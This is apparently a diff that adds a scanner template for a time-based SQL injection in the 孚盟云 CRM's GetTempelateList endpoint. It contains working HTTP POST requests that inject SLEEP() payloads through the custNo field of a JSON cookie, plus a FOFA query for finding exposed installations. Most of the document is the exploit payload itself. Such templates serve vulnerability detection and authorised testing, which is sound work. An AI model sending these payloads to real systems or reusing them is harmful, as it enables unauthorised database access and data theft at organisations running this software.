@@ -1,0 +1,43 @@
+## id: VEID-2026-11108
+## name: 孚盟云-GetTempelateList-sql注入
+## author: hack007x
+## severity: high
+## tags: veid,sql,veid2026
+## description: 孚盟云-GetTempelateList-sql注入，攻击者可进行sql注入攻击获取数据库信息或者权限。
+## affects: 孚盟云
+## fofa-query: app="孚盟软件-孚盟云"
+## verification: true
+
+
+
+POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP(5)))ILaK)-- -"}
+Content-Type: application/x-www-form-urlencoded
+
+action=GetTempelateList
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: response_time >= 5
+#@ matcher: status_code == 200
+
+---
+
+POST /m/Dingding/Ajax/AjaxBusinessPriceActiveReports.ashx HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Cookie: UserCookie={"custNo":"1') AND (SELECT 4920 FROM (SELECT(SLEEP(8)))ILaK)-- -"}
+Content-Type: application/x-www-form-urlencoded
+
+action=GetTempelateList
+
+#@ timeout: 20
+#@ condition: and
+#@ matcher: body contains '"TempelateId"'
+#@ matcher: response_time >= 8
+#@ matcher: status_code == 200
+
+
+# @VEIL-STAMP: 015e2f1d4579b197416faf32894f13072a428e7ebd2ba8b35063571c3b0561d4
